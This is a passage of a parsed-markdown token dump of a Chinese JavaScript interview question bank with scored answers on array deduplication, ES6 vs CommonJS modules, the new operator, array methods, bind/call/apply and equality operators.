方法五：使用Object对象（以元素为键）","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n//原理：利用Object的键的唯一性，将数组元素作为对象的键，值可以任意设置（这里设置为true），然后获取对象的键并转换回数组来实现去重。\\nlet array = [1, 2, 2, 3, 4, 4];\\nlet uniqueArray = [];\\nlet tempObj = {};\\nfor (let i = 0; i < array.length; i++) {\\n    let current = array[i];\\n    if (!tempObj[current]) {\\n        uniqueArray.push(current);\\n        tempObj[current] = true;\\n    }\\n}\\nconsole.log(uniqueArray);\\n//解释：首先创建一个空数组uniqueArray用于存储去重后的元素，以及一个空对象tempObj。然后遍历array数组，对于每个元素current，检查tempObj对象中是否已经存在以current为键的属性（tempObj[current]是否为true）。如果不存在，就将current添加到uniqueArray中，并在tempObj中添加一个以current为键，值为true的属性。这样，利用对象键的唯一性实现了数组去重。最后返回uniqueArray。\\n```","lang":"js","text":"//原理：利用Object的键的唯一性，将数组元素作为对象的键，值可以任意设置（这里设置为true），然后获取对象的键并转换回数组来实现去重。\\nlet array = [1, 2, 2, 3, 4, 4];\\nlet uniqueArray = [];\\nlet tempObj = {};\\nfor (let i = 0; i < array.length; i++) {\\n    let current = array[i];\\n    if (!tempObj[current]) {\\n        uniqueArray.push(current);\\n        tempObj[current] = true;\\n    }\\n}\\nconsole.log(uniqueArray);\\n//解释：首先创建一个空数组uniqueArray用于存储去重后的元素，以及一个空对象tempObj。然后遍历array数组，对于每个元素current，检查tempObj对象中是否已经存在以current为键的属性（tempObj[current]是否为true）。如果不存在，就将current添加到uniqueArray中，并在tempObj中添加一个以current为键，值为true的属性。这样，利用对象键的唯一性实现了数组去重。最后返回uniqueArray。"},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## 11. ES6 和 CommonJS 的区别\\n\\n","depth":2,"text":"11. ES6 和 CommonJS 的区别","tokens":[{"type":"text","raw":"11. ES6 和 CommonJS 的区别","text":"11. ES6 和 CommonJS 的区别","escaped":false}]},{"type":"heading","raw":"#### 类型：基础\\n\\n","depth":4,"text":"类型：基础","tokens":[{"type":"text","raw":"类型：基础","text":"类型：基础","escaped":false}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"list","raw":"- **2：** CommonJS是对模块的浅拷⻉，ES6 Module是对模块的引⽤，即ES6 Module只存只读，不能改变其值，也就是指针指向不能变，类似const\\n- **2：** import的接⼝是read-only（只读状态），不能修改其变量值。 即不能修改其变量的指针指向，但可以改变变量内部指针指向，可以对commonJS对重新赋值（改变指针指向），但是对ES6 Module赋值会编译报错","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** CommonJS是对模块的浅拷⻉，ES6 Module是对模块的引⽤，即ES6 Module只存只读，不能改变其值，也就是指针指向不能变，类似const\\n","task":false,"loose":false,"text":"**2：** CommonJS是对模块的浅拷⻉，ES6 Module是对模块的引⽤，即ES6 Module只存只读，不能改变其值，也就是指针指向不能变，类似const","tokens":[{"type":"text","raw":"**2：** CommonJS是对模块的浅拷⻉，ES6 Module是对模块的引⽤，即ES6 Module只存只读，不能改变其值，也就是指针指向不能变，类似const","text":"**2：** CommonJS是对模块的浅拷⻉，ES6 Module是对模块的引⽤，即ES6 Module只存只读，不能改变其值，也就是指针指向不能变，类似const","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" CommonJS是对模块的浅拷⻉，ES6 Module是对模块的引⽤，即ES6 Module只存只读，不能改变其值，也就是指针指向不能变，类似const","text":" CommonJS是对模块的浅拷⻉，ES6 Module是对模块的引⽤，即ES6 Module只存只读，不能改变其值，也就是指针指向不能变，类似const","escaped":false}]}]},{"type":"list_item","raw":"- **2：** import的接⼝是read-only（只读状态），不能修改其变量值。 即不能修改其变量的指针指向，但可以改变变量内部指针指向，可以对commonJS对重新赋值（改变指针指向），但是对ES6 Module赋值会编译报错","task":false,"loose":false,"text":"**2：** import的接⼝是read-only（只读状态），不能修改其变量值。 即不能修改其变量的指针指向，但可以改变变量内部指针指向，可以对commonJS对重新赋值（改变指针指向），但是对ES6 Module赋值会编译报错","tokens":[{"type":"text","raw":"**2：** import的接⼝是read-only（只读状态），不能修改其变量值。 即不能修改其变量的指针指向，但可以改变变量内部指针指向，可以对commonJS对重新赋值（改变指针指向），但是对ES6 Module赋值会编译报错","text":"**2：** import的接⼝是read-only（只读状态），不能修改其变量值。 即不能修改其变量的指针指向，但可以改变变量内部指针指向，可以对commonJS对重新赋值（改变指针指向），但是对ES6 Module赋值会编译报错","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" import的接⼝是read-only（只读状态），不能修改其变量值。 即不能修改其变量的指针指向，但可以改变变量内部指针指向，可以对commonJS对重新赋值（改变指针指向），但是对ES6 Module赋值会编译报错","text":" import的接⼝是read-only（只读状态），不能修改其变量值。 即不能修改其变量的指针指向，但可以改变变量内部指针指向，可以对commonJS对重新赋值（改变指针指向），但是对ES6 Module赋值会编译报错","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"注：S6 Module和CommonJS模块的共同点：","text":"注：S6 Module和CommonJS模块的共同点：","tokens":[{"type":"text","raw":"注：S6 Module和CommonJS模块的共同点：","text":"注：S6 Module和CommonJS模块的共同点：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"CommonJS和ES6 Module都可以对引⼊的对象进⾏赋值，即对对象内部属性的值进⾏改变","text":"CommonJS和ES6 Module都可以对引⼊的对象进⾏赋值，即对对象内部属性的值进⾏改变","tokens":[{"type":"text","raw":"CommonJS和ES6 Module都可以对引⼊的对象进⾏赋值，即对对象内部属性的值进⾏改变","text":"CommonJS和ES6 Module都可以对引⼊的对象进⾏赋值，即对对象内部属性的值进⾏改变","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"[docs](https://juejin.cn/post/7331931937357496354)","text":"[docs](https://juejin.cn/post/7331931937357496354)","tokens":[{"type":"link","raw":"[docs](https://juejin.cn/post/7331931937357496354)","href":"https://juejin.cn/post/7331931937357496354","title":null,"text":"docs","tokens":[{"type":"text","raw":"docs","text":"docs","escaped":false}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 12. new 操作符的实现原理\\n\\n","depth":2,"text":"12. new 操作符的实现原理","tokens":[{"type":"text","raw":"12. new 操作符的实现原理","text":"12. new 操作符的实现原理","escaped":false}]},{"type":"heading","raw":"#### 类型：基础\\n\\n","depth":4,"text":"类型：基础","tokens":[{"type":"text","raw":"类型：基础","text":"类型：基础","escaped":false}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"- **2：** new操作符的执行过程：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** new操作符的执行过程：","task":false,"loose":false,"text":"**2：** new操作符的执行过程：","tokens":[{"type":"text","raw":"**2：** new操作符的执行过程：","text":"**2：** new操作符的执行过程：","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" new操作符的执行过程：","text":" new操作符的执行过程：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"blockquote","raw":">（1）首先创建了一个新的空对象\\n>\\n>（2）设置原型，将对象的原型设置为函数的 prototype 对象\\n>\\n>（3）让函数的 this 指向这个对象，执行构造函数的代码（为这个新对象添加属性）\\n>\\n>（4）判断函数的返回值类型，如果是值类型，返回创建的对象。如果是引用类型，就返回这个引用类型的对象","tokens":[{"type":"paragraph","raw":"（1）首先创建了一个新的空对象","text":"（1）首先创建了一个新的空对象","tokens":[{"type":"text","raw":"（1）首先创建了一个新的空对象","text":"（1）首先创建了一个新的空对象","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"（2）设置原型，将对象的原型设置为函数的 prototype 对象","text":"（2）设置原型，将对象的原型设置为函数的 prototype 对象","tokens":[{"type":"text","raw":"（2）设置原型，将对象的原型设置为函数的 prototype 对象","text":"（2）设置原型，将对象的原型设置为函数的 prototype 对象","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"（3）让函数的 this 指向这个对象，执行构造函数的代码（为这个新对象添加属性）","text":"（3）让函数的 this 指向这个对象，执行构造函数的代码（为这个新对象添加属性）","tokens":[{"type":"text","raw":"（3）让函数的 this 指向这个对象，执行构造函数的代码（为这个新对象添加属性）","text":"（3）让函数的 this 指向这个对象，执行构造函数的代码（为这个新对象添加属性）","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"（4）判断函数的返回值类型，如果是值类型，返回创建的对象。如果是引用类型，就返回这个引用类型的对象","text":"（4）判断函数的返回值类型，如果是值类型，返回创建的对象。如果是引用类型，就返回这个引用类型的对象","tokens":[{"type":"text","raw":"（4）判断函数的返回值类型，如果是值类型，返回创建的对象。如果是引用类型，就返回这个引用类型的对象","text":"（4）判断函数的返回值类型，如果是值类型，返回创建的对象。如果是引用类型，就返回这个引用类型的对象","escaped":false}]}],"text":"（1）首先创建了一个新的空对象\\n\\n（2）设置原型，将对象的原型设置为函数的 prototype 对象\\n\\n（3）让函数的 this 指向这个对象，执行构造函数的代码（为这个新对象添加属性）\\n\\n（4）判断函数的返回值类型，如果是值类型，返回创建的对象。如果是引用类型，就返回这个引用类型的对象"},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nfunction objectFactory() {\\n  let newObject = null;\\n  let constructor = Array.prototype.shift.call(arguments);\\n  let result = null;\\n  // 判断参数是否是一个函数\\n  if (typeof constructor !== \\"function\\") {\\n    console.error(\\"type error\\");\\n    return;\\n  }\\n  // 新建一个空对象，对象的原型为构造函数的 prototype 对象\\n  newObject = Object.create(constructor.prototype);\\n  // 将 this 指向新建对象，并执行函数\\n  result = constructor.apply(newObject, arguments);\\n  // 判断返回对象\\n  let flag = result && (typeof result === \\"object\\" || typeof result === \\"function\\");\\n  // 判断返回结果\\n  return flag ? result : newObject;\\n}\\n// 使用方法\\nobjectFactory(构造函数, 初始化参数);\\n```","lang":"js","text":"function objectFactory() {\\n  let newObject = null;\\n  let constructor = Array.prototype.shift.call(arguments);\\n  let result = null;\\n  // 判断参数是否是一个函数\\n  if (typeof constructor !== \\"function\\") {\\n    console.error(\\"type error\\");\\n    return;\\n  }\\n  // 新建一个空对象，对象的原型为构造函数的 prototype 对象\\n  newObject = Object.create(constructor.prototype);\\n  // 将 this 指向新建对象，并执行函数\\n  result = constructor.apply(newObject, arguments);\\n  // 判断返回对象\\n  let flag = result && (typeof result === \\"object\\" || typeof result === \\"function\\");\\n  // 判断返回结果\\n  return flag ? result : newObject;\\n}\\n// 使用方法\\nobjectFactory(构造函数, 初始化参数);"},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## 13. 数组的原生方法有哪些？\\n\\n","depth":2,"text":"13. 数组的原生方法有哪些？","tokens":[{"type":"text","raw":"13. 数组的原生方法有哪些？","text":"13. 数组的原生方法有哪些？","escaped":false}]},{"type":"heading","raw":"#### 类型：基础\\n\\n","depth":4,"text":"类型：基础","tokens":[{"type":"text","raw":"类型：基础","text":"类型：基础","escaped":false}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（7 分）\\n\\n","depth":4,"text":"解答（7 分）","tokens":[{"type":"text","raw":"解答（7 分）","text":"解答（7 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"- **1：** 数组和字符串的转换方法：toString()、toLocalString()、join() 其中 join() 方法可以指定转换为字符串时的分隔符。\\n- **1：** 数组尾部操作的方法 pop() 和 push()，push 方法可以传入多个参数。\\n- **1：** 数组首部操作的方法 shift() 和 unshift() 重排序的方法 reverse() 和 sort()，sort() 方法可以传入一个函数来进行比较，传入前后两个值，如果返回值为正数，则交换两个参数的位置。\\n- **1：** 数组连接的方法 concat() ，返回的是拼接好的数组，不影响原数组。\\n- **1：** 数组截取办法 slice()，用于截取数组中的一部分返回，不影响原数组。\\n- **1：** 数组插入方法 splice()，影响原数组查找特定项的索引的方法，indexOf() 和 lastIndexOf() 迭代方法 every()、some()、filter()、map() 和 forEach() 方法\\n- **1：** 数组归并方法 reduce() 和 reduceRight() 方法","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 数组和字符串的转换方法：toString()、toLocalString()、join() 其中 join() 方法可以指定转换为字符串时的分隔符。\\n","task":false,"loose":false,"text":"**1：** 数组和字符串的转换方法：toString()、toLocalString()、join() 其中 join() 方法可以指定转换为字符串时的分隔符。","tokens":[{"type":"text","raw":"**1：** 数组和字符串的转换方法：toString()、toLocalString()、join() 其中 join() 方法可以指定转换为字符串时的分隔符。","text":"**1：** 数组和字符串的转换方法：toString()、toLocalString()、join() 其中 join() 方法可以指定转换为字符串时的分隔符。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 数组和字符串的转换方法：toString()、toLocalString()、join() 其中 join() 方法可以指定转换为字符串时的分隔符。","text":" 数组和字符串的转换方法：toString()、toLocalString()、join() 其中 join() 方法可以指定转换为字符串时的分隔符。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 数组尾部操作的方法 pop() 和 push()，push 方法可以传入多个参数。\\n","task":false,"loose":false,"text":"**1：** 数组尾部操作的方法 pop() 和 push()，push 方法可以传入多个参数。","tokens":[{"type":"text","raw":"**1：** 数组尾部操作的方法 pop() 和 push()，push 方法可以传入多个参数。","text":"**1：** 数组尾部操作的方法 pop() 和 push()，push 方法可以传入多个参数。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 数组尾部操作的方法 pop() 和 push()，push 方法可以传入多个参数。","text":" 数组尾部操作的方法 pop() 和 push()，push 方法可以传入多个参数。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 数组首部操作的方法 shift() 和 unshift() 重排序的方法 reverse() 和 sort()，sort() 方法可以传入一个函数来进行比较，传入前后两个值，如果返回值为正数，则交换两个参数的位置。\\n","task":false,"loose":false,"text":"**1：** 数组首部操作的方法 shift() 和 unshift() 重排序的方法 reverse() 和 sort()，sort() 方法可以传入一个函数来进行比较，传入前后两个值，如果返回值为正数，则交换两个参数的位置。","tokens":[{"type":"text","raw":"**1：** 数组首部操作的方法 shift() 和 unshift() 重排序的方法 reverse() 和 sort()，sort() 方法可以传入一个函数来进行比较，传入前后两个值，如果返回值为正数，则交换两个参数的位置。","text":"**1：** 数组首部操作的方法 shift() 和 unshift() 重排序的方法 reverse() 和 sort()，sort() 方法可以传入一个函数来进行比较，传入前后两个值，如果返回值为正数，则交换两个参数的位置。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 数组首部操作的方法 shift() 和 unshift() 重排序的方法 reverse() 和 sort()，sort() 方法可以传入一个函数来进行比较，传入前后两个值，如果返回值为正数，则交换两个参数的位置。","text":" 数组首部操作的方法 shift() 和 unshift() 重排序的方法 reverse() 和 sort()，sort() 方法可以传入一个函数来进行比较，传入前后两个值，如果返回值为正数，则交换两个参数的位置。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 数组连接的方法 concat() ，返回的是拼接好的数组，不影响原数组。\\n","task":false,"loose":false,"text":"**1：** 数组连接的方法 concat() ，返回的是拼接好的数组，不影响原数组。","tokens":[{"type":"text","raw":"**1：** 数组连接的方法 concat() ，返回的是拼接好的数组，不影响原数组。","text":"**1：** 数组连接的方法 concat() ，返回的是拼接好的数组，不影响原数组。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 数组连接的方法 concat() ，返回的是拼接好的数组，不影响原数组。","text":" 数组连接的方法 concat() ，返回的是拼接好的数组，不影响原数组。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 数组截取办法 slice()，用于截取数组中的一部分返回，不影响原数组。\\n","task":false,"loose":false,"text":"**1：** 数组截取办法 slice()，用于截取数组中的一部分返回，不影响原数组。","tokens":[{"type":"text","raw":"**1：** 数组截取办法 slice()，用于截取数组中的一部分返回，不影响原数组。","text":"**1：** 数组截取办法 slice()，用于截取数组中的一部分返回，不影响原数组。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 数组截取办法 slice()，用于截取数组中的一部分返回，不影响原数组。","text":" 数组截取办法 slice()，用于截取数组中的一部分返回，不影响原数组。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 数组插入方法 splice()，影响原数组查找特定项的索引的方法，indexOf() 和 lastIndexOf() 迭代方法 every()、some()、filter()、map() 和 forEach() 方法\\n","task":false,"loose":false,"text":"**1：** 数组插入方法 splice()，影响原数组查找特定项的索引的方法，indexOf() 和 lastIndexOf() 迭代方法 every()、some()、filter()、map() 和 forEach() 方法","tokens":[{"type":"text","raw":"**1：** 数组插入方法 splice()，影响原数组查找特定项的索引的方法，indexOf() 和 lastIndexOf() 迭代方法 every()、some()、filter()、map() 和 forEach() 方法","text":"**1：** 数组插入方法 splice()，影响原数组查找特定项的索引的方法，indexOf() 和 lastIndexOf() 迭代方法 every()、some()、filter()、map() 和 forEach() 方法","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 数组插入方法 splice()，影响原数组查找特定项的索引的方法，indexOf() 和 lastIndexOf() 迭代方法 every()、some()、filter()、map() 和 forEach() 方法","text":" 数组插入方法 splice()，影响原数组查找特定项的索引的方法，indexOf() 和 lastIndexOf() 迭代方法 every()、some()、filter()、map() 和 forEach() 方法","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 数组归并方法 reduce() 和 reduceRight() 方法","task":false,"loose":false,"text":"**1：** 数组归并方法 reduce() 和 reduceRight() 方法","tokens":[{"type":"text","raw":"**1：** 数组归并方法 reduce() 和 reduceRight() 方法","text":"**1：** 数组归并方法 reduce() 和 reduceRight() 方法","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 数组归并方法 reduce() 和 reduceRight() 方法","text":" 数组归并方法 reduce() 和 reduceRight() 方法","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## 14. bind、call、apply 区别\\n\\n","depth":2,"text":"14. bind、call、apply 区别","tokens":[{"type":"text","raw":"14. bind、call、apply 区别","text":"14. bind、call、apply 区别","escaped":false}]},{"type":"heading","raw":"#### 类型：基础\\n\\n","depth":4,"text":"类型：基础","tokens":[{"type":"text","raw":"类型：基础","text":"类型：基础","escaped":false}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"- **1：** call 和apply 都是为了解决改变 this 的指向。作⽤都是相同的，只是传参的⽅式不同\\n- **1：** 除了第⼀个参数外，call 可以接收⼀个参数列表，apply 只接受⼀个参数数组","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** call 和apply 都是为了解决改变 this 的指向。作⽤都是相同的，只是传参的⽅式不同\\n","task":false,"loose":false,"text":"**1：** call 和apply 都是为了解决改变 this 的指向。作⽤都是相同的，只是传参的⽅式不同","tokens":[{"type":"text","raw":"**1：** call 和apply 都是为了解决改变 this 的指向。作⽤都是相同的，只是传参的⽅式不同","text":"**1：** call 和apply 都是为了解决改变 this 的指向。作⽤都是相同的，只是传参的⽅式不同","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" call 和apply 都是为了解决改变 this 的指向。作⽤都是相同的，只是传参的⽅式不同","text":" call 和apply 都是为了解决改变 this 的指向。作⽤都是相同的，只是传参的⽅式不同","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 除了第⼀个参数外，call 可以接收⼀个参数列表，apply 只接受⼀个参数数组","task":false,"loose":false,"text":"**1：** 除了第⼀个参数外，call 可以接收⼀个参数列表，apply 只接受⼀个参数数组","tokens":[{"type":"text","raw":"**1：** 除了第⼀个参数外，call 可以接收⼀个参数列表，apply 只接受⼀个参数数组","text":"**1：** 除了第⼀个参数外，call 可以接收⼀个参数列表，apply 只接受⼀个参数数组","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 除了第⼀个参数外，call 可以接收⼀个参数列表，apply 只接受⼀个参数数组","text":" 除了第⼀个参数外，call 可以接收⼀个参数列表，apply 只接受⼀个参数数组","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nlet a = { value: 1 }\\nfunction\\n  getValue(name, age) {\\n  console.log(name)\\n  console.log(age)\\n  console.log(this.value)\\n}\\ngetValue.call(a, \'yck\',\'24\')\\ngetValue.apply(a,[\'yck\', \'24\'])\\n```","lang":"js","text":"let a = { value: 1 }\\nfunction\\n  getValue(name, age) {\\n  console.log(name)\\n  console.log(age)\\n  console.log(this.value)\\n}\\ngetValue.call(a, \'yck\',\'24\')\\ngetValue.apply(a,[\'yck\', \'24\'])"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** bind 和其他两个⽅法作⽤也是⼀致的，只是该⽅法会返回⼀个函数。并且我们可以通过 bind 实现柯⾥化","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** bind 和其他两个⽅法作⽤也是⼀致的，只是该⽅法会返回⼀个函数。并且我们可以通过 bind 实现柯⾥化","task":false,"loose":false,"text":"**1：** bind 和其他两个⽅法作⽤也是⼀致的，只是该⽅法会返回⼀个函数。并且我们可以通过 bind 实现柯⾥化","tokens":[{"type":"text","raw":"**1：** bind 和其他两个⽅法作⽤也是⼀致的，只是该⽅法会返回⼀个函数。并且我们可以通过 bind 实现柯⾥化","text":"**1：** bind 和其他两个⽅法作⽤也是⼀致的，只是该⽅法会返回⼀个函数。并且我们可以通过 bind 实现柯⾥化","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" bind 和其他两个⽅法作⽤也是⼀致的，只是该⽅法会返回⼀个函数。并且我们可以通过 bind 实现柯⾥化","text":" bind 和其他两个⽅法作⽤也是⼀致的，只是该⽅法会返回⼀个函数。并且我们可以通过 bind 实现柯⾥化","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## 15. == 和 ===区别，什么情况⽤ ==\\n\\n","depth":2,"text":"15. == 和 ===区别，什么情况⽤ ==","tokens":[{"type":"text","raw":"15. == 和 ===区别，什么情况⽤ ==","text":"15. == 和 ===区别，什么情况⽤ ==","escaped":false}]},{"type":"heading","raw":"#### 类型：基础\\n\\n","depth":4,"text":"类型：基础","tokens":[{"type":"text","raw":"类型：基础","text":"类型：基础","escaped":false}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：** ===⽤于判断两者类型和值是否相同。在开发中，对于后端返回的 code，可以通过 == 去判断","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** ===⽤于判断两者类型和值是否相同。在开发中，对于后端返回的 code，可以通过 == 去判断","task":false,"loose":false,"text":"**1：** ===⽤于判断两者类型和值是否相同。在开发中，对于后端返回的 code，可以通过 == 去判断","tokens":[{"type":"text","raw":"**1：** ===⽤于判断两者类型和值是否相同。在开发中，对于后端返回的 code，可以通过 == 去判断","text":"**1：** ===⽤于判断两者类型和值是否相同。在开发中，对于后端返回的 code，可以通过 == 去判断","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" ===⽤于判断两者类型和值是否相同。在开发中，对于后端返回的 code，可以通过 == 去判断","text":" ===⽤于判断两者类型和值是否相同。在开发中，对于后端返回的 code，可以通过 == 去判断","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 16. Proxy 的使用\\n\\n","depth":2,"text":"16. Proxy 的使用","tokens":[{"type":"text","raw":"16. Proxy 的使用","text":"16. Proxy 的使用","escaped":false}]},{"type":"heading","raw":"#### 